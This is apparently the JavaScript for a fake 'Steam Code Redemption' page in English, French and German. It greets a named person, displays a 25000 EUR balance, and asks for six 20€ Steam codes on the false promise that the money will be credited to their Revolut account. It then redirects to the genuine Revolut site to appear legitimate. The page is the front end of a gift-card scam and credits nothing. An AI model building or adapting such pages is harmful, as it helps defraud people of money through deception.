const translations = {
        en: {
            title: "Steam Code Redemption",
            welcome: "Welcome, Jeronyml Ursoff",
            balance: "Current Balance: 25000 EUR",
            instruction: "Please enter your six 20€ Steam codes below:",
            submit: "Submit",
            modalText: "Once all 6 codes are entered, the money will be immediately credited to your main Revolut account.",
            redirectMessage: "You will be redirected to your Revolut account in 5 seconds.",
            hints: ["Code 1", "Code 2", "Code 3", "Code 4", "Code 5", "Code 6"],
            popup: "Once all 6 codes are entered, the money will be immediately credited to your main Revolut account."
        },
        fr: {
            title: "Échange de Codes Steam",
            welcome: "Bienvenue, Jeronyml Ursoff",
            balance: "Solde actuel : 25000 EUR",
            instruction: "Veuillez saisir vos six codes Steam de 20€ ci-dessous :",
            submit: "Soumettre",
            modalText: "Une fois les 6 codes saisis, l'argent sera immédiatement crédité sur votre compte Revolut principal.",
            redirectMessage: "Vous serez redirigé vers votre compte Revolut dans 5 secondes.",
            hints: ["Code 1", "Code 2", "Code 3", "Code 4", "Code 5", "Code 6"],
            popup: "Une fois les 6 codes saisis, l'argent sera immédiatement crédité sur votre compte Revolut principal."
        },
        de: {
            title: "Steam-Code-Einlösung",
            welcome: "Willkommen, Jeronyml Ursoff",
            balance: "Aktueller Kontostand: 25000 EUR",
            instruction: "Bitte geben Sie unten Ihre sechs 20€-Steam-Codes ein:",
            submit: "Einreichen",
            modalText: "Sobald alle 6 Codes eingegeben sind, wird das Geld sofort auf Ihr Haupt-Revolut-Konto gutgeschrieben.",
            redirectMessage: "Sie werden in 5 Sekunden zu Ihrem Revolut-Konto weitergeleitet.",
            hints: ["Code 1", "Code 2", "Code 3", "Code 4", "Code 5", "Code 6"],
            popup: "Sobald alle 6 Codes eingegeben sind, wird das Geld sofort auf Ihr Haupt-Revolut-Konto gutgeschrieben."
        }
    };

    let currentLanguage = 'de'; // Default language

    function changeLanguage(lang) {
        currentLanguage = lang;
        document.getElementById('title').textContent = translations[lang].title;
        document.getElementById('welcome').innerHTML = translations[lang].welcome + ' <span class="badge"></span>';
        document.getElementById('balance').textContent = translations[lang].balance;
        document.getElementById('instruction').textContent = translations[lang].instruction;
        document.getElementById('submitButton').textContent = translations[lang].submit;
        document.getElementById('modalText').innerHTML = translations[lang].modalText + "<br><br>" + translations[lang].redirectMessage;
        document.getElementById('popup').textContent = translations[lang].popup;

        // Update hints
        for (let i = 1; i <= 6; i++) {
            document.getElementById(`hint${i}`).textContent = translations[lang].hints[i-1];
        }
    }

    function redirectToAnotherSite() {
        window.location.href = "https://www.revolut.com/en-DE/";
    }

    function submitCodes() {
        const codeInputs = document.querySelectorAll('.code-input');
        let allFilled = true;
        
        codeInputs.forEach(input => {
            if (input.value.length !== 5) {
                allFilled = false;
            }
        });

        if (allFilled) {
            showModal();
            setTimeout(redirectToAnotherSite, 5000); // Redirect after 5 seconds
        } else {
            alert("Please fill in all code fields with 5 characters each.");
        }
    }

    function showModal() {
        const modal = document.getElementById("confirmationModal");
        const span = document.getElementsByClassName("close")[0];

        modal.style.display = "block";

        span.onclick = function() {
            modal.style.display = "none";
        }

        window.onclick = function(event) {
            if (event.target == modal) {
                modal.style.display = "none";
            }
        }
    }

    // Auto-focus next input
    const codeInputs = document.querySelectorAll('.code-input');
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length === 15 && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
        });
    });

    // Show popup on page load and set default language
    window.onload = function() {
        changeLanguage(currentLanguage);
        const popup = document.getElementById("popup");
        popup.style.display = "block";
        setTimeout(function() {
            popup.style.display = "none";
        }, 5000);  // Hide popup after 5 seconds
    }